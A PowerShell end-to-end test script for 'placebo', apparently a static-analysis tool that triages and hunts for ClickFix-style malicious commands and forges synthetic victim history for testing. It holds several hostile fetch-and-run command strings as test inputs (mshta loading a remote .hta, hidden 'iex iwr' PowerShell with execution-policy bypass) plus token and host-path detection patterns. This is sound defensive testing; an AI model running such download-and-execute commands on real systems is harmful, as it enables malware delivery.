# placebo - end-to-end test: drives the built single-file CLI exactly like a user would.
# exit 0 only when every flow behaves, outputs are masked and no host paths leak.

$ErrorActionPreference = 'Stop'
Set-StrictMode -Off

$repo = Split-Path -Parent $PSScriptRoot
$dist = Join-Path $repo 'dist\placebo.ps1'
$pwsh = (Get-Process -Id $PID).Path
$tmp = if ($env:TEMP) { $env:TEMP } elseif ($env:TMPDIR) { $env:TMPDIR } else { [System.IO.Path]::GetTempPath() }
$work = Join-Path $tmp ('plb_e2e_' + [guid]::NewGuid().ToString('N').Substring(0, 8))
New-Item -ItemType Directory -Force -Path $work | Out-Null

$tok = 'ghp_' + ('A' * 36)

# forward-slash paths: .net accepts them on windows and the cli child handler
# does not split tokens at a drive colon this way
function ConvertTo-ForwardSlash { param([string]$P) return ($P -replace '\\', '/') }

$script:pass = 0; $script:fail = 0; $script:failures = @()
function Assert-True {
    param([Parameter(Mandatory)][bool]$Cond, [Parameter(Mandatory)][string]$Name)
    if ($Cond) { $script:pass++; Write-Output "  ok  $Name" }
    else { $script:fail++; $script:failures += $Name; Write-Output "  FAIL $Name" }
}

# fresh build
& $pwsh -NoProfile -File (Join-Path $repo 'build.ps1') | Out-Null
Assert-True (Test-Path $dist) -Name 'build produces dist/placebo.ps1'

Write-Output '== cli basics'
$ver = & $pwsh -NoProfile -File $dist version
Assert-True ($ver -match '^placebo 0\.1\.0$') -Name 'version output'
$help = (& $pwsh -NoProfile -File $dist --help) -join "`n"
Assert-True ($help -match 'static analysis only') -Name 'help states static-only contract'
& $pwsh -NoProfile -File $dist --bogus-flag 2>$null | Out-Null
Assert-True ($LASTEXITCODE -eq 64) -Name 'unknown option exits 64'
$rules = (& $pwsh -NoProfile -File $dist rules) -join "`n"
$count = ([regex]::Matches($rules, '\[PF-\d{3}\]')).Count
Assert-True ($count -ge 40) -Name "rules listing shows >= 40 rules (got $count)"

Write-Output '== triage flows'
& $pwsh -NoProfile -File $dist triage 'Get-Process | Sort-Object CPU' --no-banner | Out-Null
Assert-True ($LASTEXITCODE -eq 0) -Name 'benign triage exits 0'
& $pwsh -NoProfile -File $dist triage 'mshta http://198.51.100.9/captcha.hta' --no-banner | Out-Null
Assert-True ($LASTEXITCODE -eq 2) -Name 'mshta triage exits 2 (malicious)'
& $pwsh -NoProfile -File $dist triage 'powershell -w h -nop -ep bypass -c "iex iwr http://x"' --no-banner | Out-Null
Assert-True ($LASTEXITCODE -eq 3) -Name 'full chain exits 3 (critical)'

# stdin
$std = 'echo http://198.51.100.1/x | ' # contains url but benign-ish; use iex to force suspicious
$stdinOut = 'iex http://198.51.100.1/a.ps1' | & $pwsh -NoProfile -File $dist triage - --no-banner
Assert-True ($LASTEXITCODE -ge 1 -and ($stdinOut -join ' ') -match 'SUSPICIOUS|MALICIOUS') -Name 'stdin triage works'

# json structure + masking (diagnose windows-native arg quirks if it breaks)
$fxJson = ConvertTo-ForwardSlash (Join-Path $work 'tri.json')
$triCmd = "powershell -c iex http://198.51.100.4/a.ps1; echo '$tok'"
Push-Location $work
$jsonRun = & $pwsh -NoProfile -File $dist triage $triCmd --json --out=tri.json 2>&1
Pop-Location
$jsonRc = $LASTEXITCODE
if (-not (Test-Path $fxJson)) {
    Write-Output "  diag: rc=$jsonRc output: $($jsonRun -join ' | ')"
    & $pwsh -NoProfile -File $dist triage $triCmd --json --out=tri.json argv 2>&1 | ForEach-Object { Write-Output "  argv: $_" }
}
$jraw = [System.IO.File]::ReadAllText($fxJson)
$j = $jraw | ConvertFrom-Json
Assert-True ($null -ne $j -and $j.tool -eq 'placebo' -and $j.verdict -ne '') -Name 'json report structure'
Assert-True ($jraw -notmatch [regex]::Escape($tok)) -Name 'json report carries no full token'

# md report
$fxMd = ConvertTo-ForwardSlash (Join-Path $work 'tri.md')
Push-Location $work
& $pwsh -NoProfile -File $dist triage 'mshta http://203.0.113.5/a.hta' --md --out=tri.md | Out-Null
Pop-Location
$md = [System.IO.File]::ReadAllText($fxMd)
Assert-True ($md -match '^# placebo triage report') -Name 'markdown report written via --out'

Write-Output '== forge + hunt flows'
$f1 = ConvertTo-ForwardSlash (Join-Path $work 'v1'); $f2 = ConvertTo-ForwardSlash (Join-Path $work 'v2')
Push-Location $work
& $pwsh -NoProfile -File $dist forge --out=v1 --profile=clickfix-enc | Out-Null
& $pwsh -NoProfile -File $dist forge --out=v2 --profile=clickfix-enc | Out-Null
Pop-Location
Assert-True (Test-Path (Join-Path $f1 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt')) -Name 'forge creates history via cli'
$h1 = (Get-FileHash -Algorithm SHA256 (Join-Path $f1 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt')).Hash
$h2 = (Get-FileHash -Algorithm SHA256 (Join-Path $f2 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt')).Hash
Assert-True ($h1 -eq $h2) -Name 'forge deterministic via cli'

$huntJson = ConvertTo-ForwardSlash (Join-Path $work 'hunt.json')
Push-Location $work
& $pwsh -NoProfile -File $dist hunt --paths=v1 --json --out=hunt.json | Out-Null
Pop-Location
$huntExit = $LASTEXITCODE
$hj = ([System.IO.File]::ReadAllText($huntJson)) | ConvertFrom-Json
Assert-True ($huntExit -ge 2 -and $hj.verdict -eq 'critical') -Name 'hunt over forged victim exits malicious/critical'
Assert-True (@($hj.findings).Count -ge 3) -Name 'hunt findings >= 3 on forged victim'

Push-Location $work
& $pwsh -NoProfile -File $dist hunt --paths=v1 --fail-on=suspicious | Out-Null
Pop-Location
Assert-True ($LASTEXITCODE -eq 10) -Name 'hunt --fail-on=suspicious trips gate exit 10'

# clean-machine gate check must be isolated from whatever the host/runner really
# carries in its histories: point HOME/USERPROFILE at an empty dir and skip
# machine-bound sources (registry/tasks) so the result is deterministic everywhere.
$cleanHome = Join-Path $work 'cleanhome'
New-Item -ItemType Directory -Force -Path $cleanHome | Out-Null
$homeBak = $env:HOME; $upBak = $env:USERPROFILE
$env:HOME = $cleanHome; $env:USERPROFILE = $cleanHome
& $pwsh -NoProfile -File $dist hunt --fail-on=critical --no-registry --no-tasks | Out-Null
$gateRc = $LASTEXITCODE
if ($null -ne $homeBak) { $env:HOME = $homeBak } else { Remove-Item Env:HOME -ErrorAction SilentlyContinue }
if ($null -ne $upBak) { $env:USERPROFILE = $upBak } else { Remove-Item Env:USERPROFILE -ErrorAction SilentlyContinue }
Assert-True ($gateRc -eq 0) -Name 'isolated clean hunt stays under critical gate'

Write-Output '== library + module'
. $dist
$lib = Invoke-PlaceboTriage -Command 'iex http://198.51.100.3/x.ps1'
Assert-True ($lib.Verdict -ne 'clean') -Name 'dist dot-sourceable as library'

Import-Module (Join-Path $repo 'placebo.psd1') -Force
Assert-True ($null -ne (Get-Command Invoke-PlaceboTriage)) -Name 'module import exposes triage'

Write-Output '== hygiene'
# no host paths, no tokens anywhere in shipped artifacts
$bad = @()
foreach ($f in @((Get-ChildItem (Join-Path $repo 'src') -Filter '*.ps1') + (Get-Item $dist) + (Get-Item (Join-Path $repo 'placebo.psm1')) + (Get-Item (Join-Path $repo 'placebo.psd1')))) {
    $t = [System.IO.File]::ReadAllText($f.FullName)
    if ($t -match '/home/z|/Users/[a-z]+/|C:\\Users\\[A-Za-z]+\\|github_pat_[A-Za-z0-9_]{25,}|ghp_[A-Za-z0-9]{20,}') { $bad += $f.Name }
}
Assert-True ($bad.Count -eq 0) -Name "no host paths or tokens in shipped files $(if ($bad) { '(' + ($bad -join ',') + ')' })"

$term = (& $pwsh -NoProfile -File $dist triage 'iex http://198.51.100.2/x.ps1' --no-banner) -join "`n"
Assert-True ($term -notmatch '/home/z|brerabin') -Name 'terminal output carries no host context'

# cleanup
Remove-Item -Recurse -Force $work -ErrorAction SilentlyContinue

Write-Output ''
Write-Output ("e2e: pass={0} fail={1}" -f $script:pass, $script:fail)
if ($script:fail -gt 0) { Write-Output ('failed: ' + ($script:failures -join ' | ')); exit 1 }
exit 0
